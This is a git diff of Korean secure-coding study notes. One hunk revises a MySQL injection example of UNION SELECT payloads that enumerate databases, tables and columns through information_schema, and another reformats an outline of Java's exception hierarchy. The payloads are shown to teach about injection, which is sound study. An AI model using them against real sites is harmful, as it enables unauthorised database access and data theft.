@@ -91,10 +91,10 @@ http://www.openeg.co.kr/541
 ### MySQL Injection Example
 
 {% highlight sql %}
-    union select 1,2,3,4,5,6 #
-    union select schema_name,2,3,4,5,6 from information_schema.schemata#
-    union select table_name,2,3,4,5,6 from information_schema.tables where table_schema = database()#
-    union select group_concat(column_name),2,3,4,5,6 from information_schema.columns where table_name = '테이블명'#
+' union select 1,2,3,4,5,6 #
+' union select schema_name,2,3,4,5,6 from information_schema.schemata#
+' union select table_name,2,3,4,5,6 from information_schema.tables where table_schema = database()#
+' union select group_concat(column_name),2,3,4,5,6 from information_schema.columns where table_name = '테이블명'#
 {% endhighlight %}
 
 pangoline 같은 툴을 사용하면 일일이 손으로 공격값을 넣을 필요없음
@@ -322,11 +322,11 @@ while ((bytesRead = in.read(buffer)) >= 0){
 
 ### Java Exception
 
-> Throwable 
->> Error -> system abort
->> Exception 
->>>> Checked Exception -> Compiler 
->>>> *Runtime Exception* -> Problematic
+    Throwable 
+        Error -> system abort
+        Exception 
+            Checked Exception -> Compiler 
+            *Runtime Exception* -> Problematic
 
 ### 오류메시지를 통한 정보 노출
 
